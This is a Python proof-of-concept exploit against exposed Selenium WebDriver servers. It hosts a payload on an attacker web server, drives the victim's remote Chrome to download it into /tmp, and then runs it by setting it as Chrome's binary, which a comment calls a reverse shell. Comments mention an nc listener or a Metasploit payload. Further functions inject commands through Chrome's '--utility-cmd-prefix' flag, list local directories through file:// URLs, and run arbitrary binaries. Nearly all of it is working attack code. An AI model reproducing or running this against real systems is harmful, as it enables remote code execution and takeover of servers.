import socketserver
import threading
import time
import argparse
import posixpath
import urllib
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.options import Options
from http.server import HTTPServer, BaseHTTPRequestHandler


# python3 poc.py -h 10.10.10.10 -p 4444 -e "\tmp\test.exe" -w 192.168.1.1
# start nc -l port or use metasploit payload


# parsers
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,
   help="IP Selenium is running on")
parser.add_argument("-p", "--port", required=True,
   help="Port selenium is running on")
parser.add_argument("-e", "--exploit", required=True,
   help="Path to exploit")
parser.add_argument("-w", "--web", required=True,
   help="IP of machine hosting exploit (Should be attackers machine)")
args = parser.parse_args()


# attacker info
payload_name = "authorized_keys"
attack_url = args.web
attack_rev = args.exploit
attack_full = f"http://{attack_url}:8000/{payload_name}"
attack_dl = f"http://{attack_url}:8000/download"

# victim info
vic_url = args.url
vic_port = args.port
vic_full = f"http://{vic_url}:{vic_port}/wd/hub"

# download path (Where chrome downloads the binary. needs to be writeable)
download_dir = "/tmp" # \tmp linux
full_exploit = f"{download_dir}/{payload_name}"
download = f"<a href='{attack_full}' id='raw-url'>Download</a>"

driver = None

def convert(driver, element_to_check_for_dict):
    if type(element_to_check_for_dict) is dict:
        first_element_value = list(element_to_check_for_dict.values())[0]
        element_to_check_for_dict = driver.create_web_element(element_id=first_element_value)
    return element_to_check_for_dict

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _set_headers_b(self):
        self.send_response(200)
        self.send_header("Content-type", "binary/octet-stream")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        
        if self.path == '/download':
            self._set_headers()
            self.wfile.write(self._html(download))
        if self.path == f"/{payload_name}":
            self._set_headers_b()
            with open(args.exploit, 'rb') as file: 
                self.wfile.write(file.read()) # Read the file and send the contents 

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        self.wfile.write(self._html("POST!"))

def run(server_class=HTTPServer, handler_class=S, addr="0.0.0.0", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

def run_web_background():
    run()

def thread_it():
    # do some stuff
    download_thread = threading.Thread(target=run_web_background)
    download_thread.start()

def selenium_dl_payload():
    # Phase 1 download reverse shell
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    preferences = {"download.default_directory": download_dir ,
               	"directory_upgrade": True,
               	"safebrowsing.enabled": True }
    chrome_options.add_experimental_option("prefs", preferences)
    driver = webdriver.Remote(command_executor=vic_full, options=chrome_options)
    # Selenium flow
    driver.get(attack_dl);
    print(driver.page_source)
    dl = driver.find_element_by_id("raw-url")
    dl = convert(driver, dl)
    print("waiting to click")
    time.sleep(10)
    dl.click()
    print("clicked")
    driver.quit()

def get_list(directory):
    print(f"listing {directory}")
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME)
    driver.get(f"file://{directory}")
    print(driver.page_source)
    driver.quit()

def get_source(url):
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME)
    driver.get(url)
    print(driver.page_source)
    driver.quit()

def exec(command, args):
    # Phase 2 execute reverse shell
    #print('Waiting for file to download')
    #time.sleep(10)
    print('executing...')
    option = Options()
    option.binary_location = command
    for i in args:
        option.add_argument(i)
    driver = webdriver.Remote(command_executor=vic_full, options=option)
    driver.get('http://google.com/')
    driver.quit()

def exploit():
    # Phase 2 execute reverse shell
    print('Waiting for file to download')
    time.sleep(10)
    print('Check for shell.')
    option = Options()
    option.add_argument("--no-sandbox")
    option.add_argument("--disable-dev-shm-usage")
    option.binary_location = full_exploit
    driver = webdriver.Remote(command_executor=vic_full, options=option)
    driver.get('http://google.com/')
    driver.quit()

def prefix_attack(payload):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--utility-and-browser")
    chrome_options.add_argument("--utility-cmd-prefix="+payload)
    #option.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME, options=chrome_options)
    driver.get("http://google.com")
    print("executed")
    driver.quit()

def property_method(path):
    driver = webdriver.Remote(command_executor=vic_full, executable_path=path)
    driver.get('https://google.com/')
    driver.quit()

def main():
    thread_it()
    time.sleep(5)
    print("starting download")
    selenium_dl_payload()
    print("starting exploit")
    exploit()


#if __name__ == '__main__':
    #main()

